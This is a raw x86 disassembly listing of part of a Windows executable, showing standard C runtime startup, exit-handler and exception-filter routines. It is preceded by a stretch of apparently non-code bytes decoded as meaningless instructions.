  422689:	call   0x7406:0x80d00f3
  422690:	pusha  
  422691:	xchg   ebp,eax
  422692:	mov    eax,ds:0x489b3a5f
  422697:	push   ecx
  422698:	sbb    al,0x70
  42269a:	mov    esi,0x6c821e9c
  42269f:	test   BYTE PTR [ecx],bl
  4226a1:	pop    ebp
  4226a2:	pop    ss
  4226a3:	fcom   QWORD PTR [edi+0x7b5b6a31]
  4226a9:	dec    esi
  4226aa:	adc    DWORD PTR [esi+0x3d],0xd2280d62
  4226b1:	mov    dl,0x1
  4226b3:	jae    0x4226dd
  4226b5:	mov    dh,0x2
  4226b7:	mov    al,ds:0x3e1590ff
  4226bc:	jnp    0x42266a
  4226be:	adc    al,0xcc
  4226c0:	sub    al,0x58
  4226c2:	shr    eax,cl
  4226c4:	inc    esi
  4226c5:	xor    eax,0xeb087091
  4226ca:	in     eax,0xe
  4226cc:	push   edi
  4226cd:	mov    eax,0xa096c13b
  4226d2:	popf   
  4226d3:	rol    eax,1
  4226d5:	adc    eax,0x36d50136
  4226da:	add    eax,0xf2598b59
  4226df:	xchg   ebp,eax
  4226e0:	add    dh,BYTE PTR [ecx-0x7a46b211]
  4226e6:	js     0x422696
  4226e8:	push   esp
  4226e9:	lods   al,BYTE PTR ds:[esi]
  4226eb:	mov    ebp,0x5e50e85f
  4226f0:	jg     0x422754
  4226f2:	dec    eax
  4226f3:	int    0xc
  4226f5:	(bad)  
  4226f6:	mov    ch,0xb7
  4226f8:	loopne 0x42273f
  4226fa:	std    
  4226fb:	out    dx,al
  4226fc:	pusha  
  4226fd:	pusha  
  4226fe:	in     eax,0x6c
  422700:	clc    
  422701:	or     ebp,DWORD PTR [ebx-0x35]
  422704:	or     ebp,eax
  422706:	aaa    
  422707:	xchg   DWORD PTR [esi],esp
  422709:	mov    cl,0xba
  42270b:	and    eax,0xffffffb8
  42270e:	js     0x4226fd
  422710:	mov    esi,0x1dfb3775
  422715:	inc    edx
  422716:	data16 lods al,BYTE PTR ds:[esi]
  422718:	mov    ecx,0xd36acb9d
  42271d:	push   edi
  42271e:	pop    es
  42271f:	cmp    eax,0xeac1e3fc
  422724:	aaa    
  422725:	sub    DWORD PTR [bp+si-0x7b],edi
  422729:	scas   al,BYTE PTR es:[edi]
  42272a:	mov    eax,gs
  42272c:	fmul   DWORD PTR [edi]
  42272e:	in     eax,dx
  42272f:	push   ebp
  422730:	out    dx,al
  422731:	xor    ebp,DWORD PTR [esi]
  422733:	mov    ebp,0x7377096d
  422738:	aam    0xbe
  42273a:	push   esi
  42273b:	and    eax,0x2fb70cbc
  422740:	repz iret 
  422742:	mov    al,ds:0x671b5615
  422747:	adc    eax,0x35bc74c3
  42274c:	cmp    BYTE PTR [eax],al
  42274e:	mov    cl,ch
  422750:	jns    0x4226ec
  422752:	mov    ebp,0x5a7de00c
  422757:	mov    ds:0xb69d46ea,al
  42275c:	popa   
  42275d:	repz rcl DWORD PTR [ebx-0x1d],0x15
  422762:	mov    esp,0xedd3b1a7
  422767:	cmp    eax,0x5f2a888
  42276c:	add    BYTE PTR [edx+eax*8+0x60],ah
  422770:	ds xor al,0xc3
  422773:	ss jge 0x4227ac
  422776:	call   0xe7f9a1be
  42277b:	lock repnz and bh,BYTE PTR [esi-0x46]
  422780:	mov    ds:0x29a536cb,eax
  422785:	popa   
  422786:	mov    edx,0x3e1f602b
  42278b:	jle    0x42275e
  42278d:	gs aaa 
  42278f:	mov    WORD PTR [esi+0x61f7c733],cs
  422795:	cmp    DWORD PTR [ebp+0x7],esi
  422798:	xchg   ebp,eax
  422799:	mov    esp,0xb7992791
  42279e:	retf   0x7d93
  4227a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227a2:	fadd   QWORD PTR [edi+0x5e]
  4227a5:	jmp    0x422812
  4227a7:	fbld   TBYTE PTR [edx-0x21fc505e]
  4227ad:	and    DWORD PTR [ecx-0x432bc847],esi
  4227b3:	and    dh,0xc2
  4227b6:	test   eax,0x13d2069c
  4227bb:	ds fcmovne st,st(2)
  4227be:	sbb    BYTE PTR [ecx+0x45],cl
  4227c1:	sub    ebp,0x32
  4227c4:	int3   
  4227c5:	gs mov bh,0xb8
  4227c8:	fistp  DWORD PTR [ecx+edi*2+0x6a089fde]
  4227cf:	sbb    al,0x8c
  4227d1:	idiv   DWORD PTR [edx-0x28360d3e]
  4227d7:	jae    0x422828
  4227d9:	mov    ch,0xbb
  4227db:	mov    ah,0x4
  4227dd:	xchg   BYTE PTR [edx],ah
  4227df:	jmp    0x1dde3a0
  4227e4:	out    dx,al
  4227e5:	in     eax,dx
  4227e6:	or     al,0xb7
  4227e8:	ret    
  4227e9:	xor    eax,0x7e88787e
  4227ee:	add    ah,bl
  4227f0:	loop   0x4227f5
  4227f2:	sbb    DWORD PTR [edi],ebx
  4227f4:	sbb    esp,edi
  4227f6:	inc    esp
  4227f7:	cli    
  4227f8:	xchg   DWORD PTR ds:0x7745d739,ebx
  4227fe:	stos   BYTE PTR es:[edi],al
  4227ff:	pop    esi
  422800:	xor    eax,0xbeb0e64d
  422805:	(bad)  
  422806:	test   bl,0xea
  422809:	push   esp
  42280a:	add    ebp,edx
  42280c:	xchg   esp,eax
  42280d:	repz popa 
  42280f:	jbe    0x4227ab
  422811:	ss jb  0x42283a
  422814:	and    bh,BYTE PTR [eax]
  422816:	and    esp,ecx
  422818:	mov    ebx,0x7d4a2066
  42281d:	mov    ch,0x3f
  42281f:	inc    ebx
  422820:	scas   al,BYTE PTR es:[edi]
  422821:	retf   0xf7bd
  422824:	push   edi
  422825:	mov    al,0x59
  422827:	loopne 0x42286a
  422829:	jae    0x4227ca
  42282b:	cmp    BYTE PTR [eax-0x6cd5f31e],al
  422831:	jo     0x42284b
  422833:	and    ecx,DWORD PTR [ebx+0x40a0f5ea]
  422839:	test   eax,0x6fd8226a
  42283e:	rcr    BYTE PTR [edx+0x43],cl
  422841:	add    al,0x1a
  422843:	push   ss
  422844:	and    bl,0x4a
  422847:	(bad)  
  422849:	jns    0x422887
  42284b:	inc    eax
  42284c:	mov    edx,0xa5e9671f
  422851:	xor    al,0x31
  422853:	in     eax,dx
  422854:	push   ecx
  422855:	push   ss
  422856:	dec    eax
  422857:	(bad)  
  422858:	push   es
  422859:	ins    BYTE PTR es:[edi],dx
  42285a:	dec    esi
  42285b:	or     eax,0xc1a93206
  422860:	aad    0xb5
  422862:	and    edi,edi
  422864:	inc    ebp
  422865:	rcl    DWORD PTR [esi+0x4c8b2571],cl
  42286b:	(bad)
  42286e:	test   bl,bh
  422870:	(bad)
  422874:	and    eax,0x8a7c2614
  422879:	out    0x5,al
  42287b:	rcr    BYTE PTR [ecx],cl
  42287d:	inc    eax
  42287e:	(bad)
  422881:	(bad)  
  422882:	(bad)  
  422884:	inc    edi
  422885:	xchg   edi,eax
  422886:	inc    edi
  422887:	mov    DWORD PTR [ebx-0x7a],edx
  42288a:	stos   BYTE PTR es:[edi],al
  42288b:	sub    dl,BYTE PTR [esi+ebx*1]
  42288e:	sbb    edx,edx
  422890:	ss dec esp
  422892:	cli    
  422893:	cdq    
  422894:	dec    ebp
  422895:	(bad)  
  422896:	push   edx
  422897:	enter  0x6b48,0x84
  42289b:	lahf   
  42289c:	sti    
  42289d:	aaa    
  42289e:	stos   DWORD PTR es:[edi],eax
  42289f:	test   DWORD PTR [ecx+0xd],ebx
  4228a2:	sbb    BYTE PTR [esi+0x38609a17],bl
  4228a8:	adc    DWORD PTR [esi],ebp
  4228aa:	push   ebp
  4228ab:	mov    dh,0x8c
  4228ad:	mov    dh,0xa4
  4228af:	adc    BYTE PTR [edx],dl
  4228b1:	push   es
  4228b2:	div    BYTE PTR [ebx+0x67]
  4228b5:	or     ebp,DWORD PTR [edx-0x6fd1d2e8]
  4228bb:	mov    dl,0xcc
  4228bd:	inc    ecx
  4228be:	cmc    
  4228bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228c0:	dec    esi
  4228c1:	rol    BYTE PTR [ecx-0x5181c603],cl
  4228c7:	push   esp
  4228c8:	fnstsw WORD PTR [eax]
  4228ca:	mov    cl,0x22
  4228cc:	jle    0x42289f
  4228ce:	add    dl,BYTE PTR [edx]
  4228d0:	mov    eax,0xd120fe41
  4228d5:	int3   
  4228d6:	jnp    0x422911
  4228d8:	jmp    0x4228dc
  4228da:	xlat   BYTE PTR ds:[ebx]
  4228db:	adc    DWORD PTR [ecx-0x27],edx
  4228de:	push   ss
  4228df:	imul   ebx,DWORD PTR [edi+ebp*4+0x18],0xc80d8bb
  4228e7:	inc    edi
  4228e8:	add    DWORD PTR [ecx+0x1f8c388f],ecx
  4228ee:	or     eax,DWORD PTR [ebx-0x58]
  4228f1:	inc    ebx
  4228f2:	lea    eax,[ecx]
  4228f4:	and    BYTE PTR fs:[ebx+ebx*4+0x203ab465],ch
  4228fc:	pop    edx
  4228fd:	js     0x4228da
  4228ff:	lea    ebx,[edx-0x3c6bbcd]
  422905:	and    edx,DWORD PTR ds:0x630be473
  42290b:	lea    ecx,[esi+0x1e]
  42290e:	mov    WORD PTR [ebx-0x7b5763c4],ss
  422914:	test   al,0x33
  422916:	ror    BYTE PTR [ebx+0x10c25de5],0x0
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
